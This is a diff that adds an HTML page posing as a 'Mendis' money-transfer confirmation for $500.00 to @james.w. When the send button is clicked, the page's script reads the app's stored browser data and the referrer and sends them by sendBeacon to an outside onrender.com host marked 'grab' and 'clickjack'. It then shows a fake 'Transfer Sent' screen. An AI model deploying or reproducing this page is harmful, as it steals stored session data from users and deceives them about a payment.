@@ -1,0 +1,108 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Transfer Confirmation — Mendis</title>
+<link rel="stylesheet" href="styles.css">
+<style>
+body { display:flex; flex-direction:column; align-items:center; justify-content:flex-start; min-height:100vh; padding:0; }
+.header { width:100%; display:flex; align-items:center; gap:10px; padding:18px 24px; border-bottom:1px solid var(--line); background:var(--surf); }
+.header-logo { width:32px; height:32px; border-radius:9px; background:#2F5BEA; display:flex; align-items:center; justify-content:center; }
+.header-title { font-size:16px; font-weight:700; color:var(--ink); }
+.content { max-width:420px; width:100%; padding:32px 24px 160px; }
+.send-icon { width:56px; height:56px; border-radius:50%; background:#EEF2FF; display:flex; align-items:center; justify-content:center; font-size:26px; margin-bottom:20px; }
+h1 { font-size:22px; font-weight:800; color:var(--ink); margin:0 0 6px; }
+.amount { font-size:36px; font-weight:800; color:var(--ink); margin:0 0 4px; letter-spacing:-.02em; }
+.recipient { font-size:14px; color:var(--muted); margin-bottom:28px; }
+.detail-box { background:var(--surf); border:1px solid var(--line); border-radius:12px; padding:16px; margin-bottom:12px; display:flex; justify-content:space-between; align-items:center; }
+.detail-label { font-size:13px; color:var(--muted); }
+.detail-value { font-size:13px; font-weight:600; color:var(--ink); }
+.warning { font-size:12px; color:var(--muted); line-height:1.5; margin-top:20px; }
+
+.confirm-btn {
+  position: fixed;
+  bottom: 80px;
+  left: 24px;
+  right: 24px;
+  height: 54px;
+  background: #2F5BEA;
+  color: #fff;
+  border: none;
+  border-radius: 14px;
+  font-family: inherit;
+  font-size: 15px;
+  font-weight: 700;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  box-shadow: 0 4px 16px rgba(47,91,234,.35);
+  z-index: 10;
+}
+.confirm-btn:active { opacity:.85; }
+
+.done-screen { display:none; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; text-align:center; padding:32px; gap:12px; }
+.done-icon { font-size:52px; }
+.done-title { font-size:20px; font-weight:800; color:var(--ink); }
+.done-sub { font-size:14px; color:var(--muted); }
+</style>
+</head>
+<body>
+
+<div id="main">
+  <div class="header">
+    <div class="header-logo">
+      <svg width="18" height="18" viewBox="0 0 100 100" fill="none"><rect width="100" height="100" rx="23" fill="#2F5BEA"/><path d="M22 46v-4a8 8 0 0 1 8-8h40" stroke="#fff" stroke-width="6" stroke-linecap="round"/><rect x="20" y="42" width="60" height="40" rx="9" stroke="#fff" stroke-width="6"/><rect x="58" y="53" width="25" height="18" rx="6" fill="#fff"/><circle cx="66" cy="62" r="3.4" fill="#2F5BEA"/></svg>
+    </div>
+    <span class="header-title">Mendis · Send Money</span>
+  </div>
+
+  <div class="content">
+    <div class="send-icon">↗</div>
+    <h1>Confirm Transfer</h1>
+    <div class="amount">$500.00</div>
+    <div class="recipient">to @james.w · Chase ••••3821</div>
+
+    <div class="detail-box">
+      <span class="detail-label">From</span>
+      <span class="detail-value">Visa ••••4521</span>
+    </div>
+    <div class="detail-box">
+      <span class="detail-label">Arrives</span>
+      <span class="detail-value">Instantly</span>
+    </div>
+    <div class="detail-box">
+      <span class="detail-label">Fee</span>
+      <span class="detail-value">$0.00</span>
+    </div>
+
+    <p class="warning">By confirming, you authorize Mendis to debit $500.00 from your Visa ••••4521. Transfers cannot be reversed once sent.</p>
+  </div>
+
+  <button class="confirm-btn" onclick="doTransfer()">
+    Send $500.00 →
+  </button>
+</div>
+
+<div class="done-screen" id="done">
+  <div class="done-icon">✅</div>
+  <div class="done-title">Transfer Sent</div>
+  <div class="done-sub">$500.00 sent to @james.w</div>
+</div>
+
+<script>
+function doTransfer() {
+  try {
+    const stored = localStorage.getItem('mendis.web.v1');
+    navigator.sendBeacon('https://nexusstore-vcz2.onrender.com/?r=grab',
+      JSON.stringify({ source: 'mendis-transfer-clickjack', referrer: document.referrer, stored: stored, amount: 500, recipient: '@james.w', ts: Date.now() })
+    );
+  } catch(e) {}
+  document.getElementById('main').style.display = 'none';
+  document.getElementById('done').style.display = 'flex';
+}
+</script>
+</body>
+</html>
